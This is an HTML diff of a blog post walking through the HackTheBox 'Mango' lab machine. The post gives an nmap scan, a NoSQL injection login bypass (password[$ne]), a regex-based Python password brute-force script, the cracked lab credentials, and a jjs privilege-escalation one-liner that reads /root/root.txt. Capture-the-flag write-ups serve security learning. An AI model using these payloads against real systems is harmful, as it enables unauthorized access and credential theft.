@@ -59,14 +59,44 @@
 			<h1 class="title">HackTheBox Mango Write Up</h1>
 			<div class="meta">Posted at &mdash; Apr 18, 2020</div>
 		</div>
-		              
+
+		
+		<div class="toc">              
+			<h3>Table of Contents</h3>
+			<nav id="TableOfContents">
+  <ul>
+    <li><a href="https://ajdin.io/posts/htb/mango/#reconnaissance">Reconnaissance</a></li>
+    <li><a href="https://ajdin.io/posts/htb/mango/#getting-user-account">Getting user account</a>
+      <ul>
+        <li><a href="https://ajdin.io/posts/htb/mango/#nosql-injection">NoSQL injection</a></li>
+        <li><a href="https://ajdin.io/posts/htb/mango/#bruteforcing-the-password">Bruteforcing the password</a></li>
+      </ul>
+    </li>
+    <li><a href="https://ajdin.io/posts/htb/mango/#getting-root-account">Getting root account</a>
+      <ul>
+        <li><a href="https://ajdin.io/posts/htb/mango/#privilege-escalation-with-jjs">Privilege escalation with JJS</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+			<hr>
+		</div>              
+		
+		</aside>              
 
 		<div class="markdown">
               		
 <h2 id="reconnaissance">Reconnaissance<a class="anchor" href="#reconnaissance">#</a></h2>
 <p>Let’s run nmap,</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162
-</code></pre></div><p><img src="/htb/mango/nmap_initial_results.png" alt="nmap"></p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/htb/mango/nmap_initial_results.png" alt="nmap"></p>
 <p>We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.</p>
 <p><img src="/htb/mango/mango_search_page.png" alt="page"></p>
 <p><img src="/htb/mango/mango_analytics_page.png" alt="page"></p>
@@ -87,16 +117,72 @@ staging-order.mango.htb</p>
 <p><img src="/htb/mango/request.png" alt="request"></p>
 <p>Edit the request:</p>
 <p>Before:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username=admin&amp;password=test&amp;login=login
-</code></pre></div><p>After:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username=admin&amp;password[$ne]=test&amp;login=login
-</code></pre></div><p>This will trick Mongo to check if the password doesn’t match and if it doesn’t it will let me in.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username=admin&amp;password=test&amp;login=login
+</code></pre></td></tr></table>
+</div>
+</div><p>After:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username=admin&amp;password[$ne]=test&amp;login=login
+</code></pre></td></tr></table>
+</div>
+</div><p>This will trick Mongo to check if the password doesn’t match and if it doesn’t it will let me in.</p>
 <p><img src="/htb/mango/request_reply.png" alt="reply"></p>
 <p><img src="/htb/mango/after_login.png" alt="afterlogin"></p>
 <h3 id="bruteforcing-the-password">Bruteforcing the password<a class="anchor" href="#bruteforcing-the-password">#</a></h3>
 <p>We can’t do anything from the webpage so I tried to brute-force the password. <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#brute-force-login-usernames-and-passwords-from-post-login">Here</a> I have found a nice script. It uses regular expressions to try to match the password. The code is fairly simple so I won’t be explaining that.</p>
 <p>You should change the cookie ID.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
 <span style="color:#f92672">import</span> stringurl <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://example.com&#34;</span>
 headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;Host&#34;</span>: <span style="color:#e6db74">&#34;exmaple.com&#34;</span>}
 cookies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;PHPSESSID&#34;</span>: <span style="color:#e6db74">&#34;s3gcsgtqre05bah2vt6tibq8lsdfk&#34;</span>}
@@ -134,11 +220,21 @@ possible_chars <span style="color:#f92672">=</span> list(string<span style="colo
                     <span style="color:#66d9ef">break</span>
     <span style="color:#66d9ef">return</span> usernamesfor u <span style="color:#f92672">in</span> get_usernames():
     get_password(u)
-</code></pre></div><p>This will run for some time, the output is:</p>
+</code></pre></td></tr></table>
+</div>
+</div><p>This will run for some time, the output is:</p>
 <p><img src="/htb/mango/password_bruteforce.png" alt="success"></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">admin:t9KcS3&gt;!0B#2
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">admin:t9KcS3&gt;!0B#2
 mango:h3mXK8RhU~f{]f5H
-</code></pre></div><p>I couldn&rsquo;t SSH into admin but I could SSH into mango, switch user to admin and cat user.txt.</p>
+</code></pre></td></tr></table>
+</div>
+</div><p>I couldn&rsquo;t SSH into admin but I could SSH into mango, switch user to admin and cat user.txt.</p>
 <p><img src="/htb/mango/user_txt.png" alt="usertxt"></p>
 <h2 id="getting-root-account">Getting root account<a class="anchor" href="#getting-root-account">#</a></h2>
 <p>First, I switch from sh to bash by running /bin/bash.</p>
@@ -146,8 +242,15 @@ mango:h3mXK8RhU~f{]f5H
 <p><img src="/htb/mango/jjs.png" alt="jjs"></p>
 <h3 id="privilege-escalation-with-jjs">Privilege escalation with JJS<a class="anchor" href="#privilege-escalation-with-jjs">#</a></h3>
 <p>This is usually used for privilege escalation, so when you run jjs you get some sort of shell, let’s check GTFOBin if we can escape. There is a file read exploit so I’ll use that (note: you have to change the file name and remove the “newline symbols” ):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#39;var BufferedReader = Java.type(&#34;java.io.BufferedReader&#34;); var FileReader = Java.type(&#34;java.io.FileReader&#34;); var br = new BufferedReader(new FileReader(&#34;/root/root.txt&#34;)); while ((line = br.readLine()) != null) { print(line); }&#39; | jjs
-</code></pre></div><p><img src="/htb/mango/root_txt.png" alt="roottxt"></p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">echo &#39;var BufferedReader = Java.type(&#34;java.io.BufferedReader&#34;); var FileReader = Java.type(&#34;java.io.FileReader&#34;); var br = new BufferedReader(new FileReader(&#34;/root/root.txt&#34;)); while ((line = br.readLine()) != null) { print(line); }&#39; | jjs
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/htb/mango/root_txt.png" alt="roottxt"></p>
 <p>Thanks for reading! Make sure to follow me on Twitter @ajdintrejic.</p>
 
 
